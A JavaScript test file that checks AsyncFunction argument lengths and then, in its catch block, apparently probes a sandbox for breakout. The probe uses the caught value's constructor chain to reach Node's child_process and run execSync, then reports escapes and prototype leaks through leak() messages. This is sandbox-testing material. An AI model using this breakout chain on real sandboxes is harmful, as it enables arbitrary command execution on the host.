try {
    var AsyncFunction = async function foo() {
        throw () => {
            return () => {
            };
        };
    }.constructor;
    var fn;
    fn = AsyncFunction('a', 'await 1;');
    assert.sameValue(fn.length, 1, 'length with 1 argument, call');
    fn = AsyncFunction('a,b', 'await 1;');
    assert.sameValue(fn.length, 2, 'length with 2 arguments in one, call');
    fn = AsyncFunction('a', 'b', 'await 1;');
    assert.sameValue(fn.length, 2, 'length with 2 arguments, call');
    fn = new AsyncFunction('a', 'await 1;');
    assert.sameValue(fn.length, 1, 'length with 1 argument, construct');
    fn = new AsyncFunction('a,b', 'await 1;');
    assert.sameValue(fn.length, 2, 'length with 2 arguments in one, construct');
    fn = new AsyncFunction('a', 'b', 'await 1;');
    assert.sameValue(fn.length, 2, 'length with 2 arguments, construct');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}